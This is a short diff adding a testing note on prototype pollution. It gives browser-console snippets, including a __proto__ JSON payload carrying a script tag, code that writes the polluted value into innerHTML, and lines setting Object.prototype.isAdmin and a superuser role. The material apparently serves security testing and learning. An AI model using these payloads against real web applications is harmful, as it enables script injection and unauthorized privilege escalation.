@@ -1,0 +1,10 @@
+1. Prototype Pollution
+
+Use the Browser console to test : Dev tools
+
+{ "__proto__": { "XSS": "<script>alert('silent')</script>" } }
+console.log({}.XSS);
+document.body.innerHTML = "<div>" + {}.XSS + "</div>";
+Object.prototype.isAdmin = true;
+Object.prototype.role = "superuser";
+{ "__proto__": { "XSS": "<script>alert('silent')</script>" } }
